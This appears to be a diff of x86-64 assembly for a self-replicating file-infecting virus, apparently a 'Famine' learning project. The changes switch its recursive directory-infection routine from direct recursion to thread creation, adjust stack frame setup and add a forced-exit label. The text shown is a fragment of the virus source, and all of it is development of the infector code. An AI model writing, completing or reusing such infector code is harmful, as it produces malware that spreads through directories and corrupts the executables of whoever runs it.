@@ -14,8 +14,10 @@ section .text
 	global _string
 	global _read_dir
 	global _ft_strlen
+	global _force_exit
 	extern _treat_file
 	extern _final_end
+	extern _thread_create
 
 _o_entry:
 	dq 0x0000000000000000 
@@ -56,18 +58,23 @@ _start:
 	mov rdi, rsp
 	mov rsi, rsp
 	add rsi, 16
+	push rsi
+	push rdi
 	call _read_dir
-	mov BYTE [rsp + 8], 0x32
-	mov rdi, rsp
-	mov rsi, rsp
-	add rsi, 16
-	call _read_dir
+;	mov BYTE [rsp + 24], 0x32
+;	mov rdi, rsp
+;	mov rsi, rsp
+;	add rsi, 16
+;	call _read_dir
+	pop rdi
+	pop rdi
 	pop rdi
 	pop rdi
 	pop rdi
 	lea rax, [rel _o_entry] ; mov in rax the o_entry address
 	cmp QWORD [rax], 0 ; if this address is 0, so we are in famine exec, and we need to exit
 	jne _jmp_to_o_entry
+_force_exit:
 	mov rax, 60 ; exit syscall number, will not be in final code
 	mov rdi, 0
 	syscall
@@ -106,10 +113,10 @@ _strlen_end:
 	ret
 
 _read_dir: ; void read_dir(char *actual_directory, char *path_of_dir)
-	push rbp
-	mov rbp, rsp
-	sub rsp, 368
-;	enter 336, 0
+;	push rbp
+;	mov rbp, rsp
+;	sub rsp, 368
+	enter 368, 0
 	; rsp + 0: dir struct
 	; rsp + 280: virus size
 	; rsp + 288: fd directory
@@ -121,6 +128,8 @@ _read_dir: ; void read_dir(char *actual_directory, char *path_of_dir)
 	; rsp + 336: total size
 	; rsp + 344: 2 arg
 	; rsp - size: size of total path for this dir
+	mov rdi, QWORD [rsp + 384]
+	mov rsi, QWORD [rsp + 392]
 	mov QWORD [rsp + 312], rdi ; store first arg in stack
 	mov QWORD [rsp + 344], rsi
 	mov rdi, rsi ; calcul len of arg 2
@@ -289,16 +298,20 @@ _recursiv_infect:
 	je _continue
 	cmp WORD [rsi], 0x002e2e
 	je _continue
-	mov rdi, rsi
-	mov rsi, rsp
+;	mov rdi, rsi
+;	mov rsi, rsp
+	lea rdi, [rel _read_dir]
+	mov rdx, rsp
 	mov r10, QWORD [rsp + 336]
-	sub rsi, r10
+;	sub rsi, r10
+	sub rdx, r10
 	sub rsp, r10
 	sub rsp, 8
 	mov QWORD [rsp], r10
 	add QWORD [rsp], 8
 _lab_lol:
-	call _read_dir
+;	call _read_dir
+	call _thread_create
 	add rsp, QWORD [rsp]
 
 _continue:
